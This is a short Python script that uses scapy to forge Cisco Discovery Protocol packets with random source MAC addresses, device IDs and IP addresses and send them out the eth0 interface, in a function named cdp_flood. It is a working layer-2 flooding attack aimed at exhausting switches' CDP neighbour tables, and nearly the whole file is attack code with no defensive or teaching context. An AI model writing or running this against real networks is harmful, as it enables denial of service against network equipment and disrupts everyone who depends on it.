import string

import scapy.all as scapy
from scapy.contrib.cdp import CDPv2_HDR, CDPMsgPortID, CDPMsgCapabilities, CDPMsgSoftwareVersion, CDPMsgPlatform, \
    CDPMsgDeviceID, CDPAddrRecordIPv4, CDPMsgAddr
from scapy.layers.l2 import LLC, SNAP, Ether
from scapy.main import load_contrib
from scapy.sendrecv import sendp
load_contrib("cdp")

def genRandomDeviceID():
    return ''.join(scapy.random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in range(7))

def cdp_flood():
    cdp_ether= Ether(dst='01:00:0c:cc:cc:cc', src=scapy.RandString(12, "0123456789abcdef"))
    cdp_did = CDPMsgDeviceID(val=genRandomDeviceID())
    cdp_addrv = CDPAddrRecordIPv4()
    cdp_addrv.addr = str(scapy.RandIP())
    cdp_addr = CDPMsgAddr(addr=cdp_addrv)
    cdppacket = cdp_ether / LLC() / SNAP() /  CDPv2_HDR()/ cdp_did / cdp_addr / CDPMsgPortID() / CDPMsgCapabilities() / CDPMsgSoftwareVersion() / CDPMsgPlatform()
    cdppacket.show()
    sendp(cdppacket, iface='eth0')